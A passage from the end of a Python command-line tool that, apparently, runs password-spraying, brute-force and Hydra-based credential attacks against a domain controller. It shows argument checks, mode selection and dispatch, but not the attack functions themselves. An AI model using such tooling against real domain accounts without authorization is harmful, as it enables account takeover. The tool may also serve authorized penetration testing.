            console.print(f"[bold red]{t('err_ps_needs_userlist', lang)}[/bold red]"); sys.exit(1)
    elif args.bf:
        mode = "bf"
        if not protocols:
            console.print(f"[bold red]{t('err_bf_needs_proto', lang)}[/bold red]"); sys.exit(1)
        if not args.passwordlist:
            console.print(f"[bold red]{t('err_bf_needs_passlist', lang)}[/bold red]"); sys.exit(1)
    else:
        mode = "hbf"
        if not args.userlist:
            console.print(f"[bold red]{t('err_hbf_needs_userlist', lang)}[/bold red]"); sys.exit(1)

    info = get_mode_info(lang)[mode]
    console.print(
        f"[bold {info['color']}]{t('mode_label', lang)}: {info['name']}[/bold {info['color']}]   "
        f"[bold]{t('risk_label', lang)}:[/bold] {info['risk']}   "
        f"[bold]{t('target_dc_label', lang)}:[/bold] {args.dc}   [bold]{t('domain_label', lang)}:[/bold] {args.domain}"
    )
    console.print(Rule(style="cyan"))
    console.print()

    try:
        if mode == "ps":
            run_password_spray(args, protocols, lang)
        elif mode == "bf":
            run_brute_force(args, protocols, lang)
        else:
            run_hydra_brute_force(args, lang)
    except KeyboardInterrupt:
        console.print(f"\n[bold yellow]{t('stopped_by_user', lang)}[/bold yellow]")
        sys.exit(0)


if __name__ == "__main__":
    main()
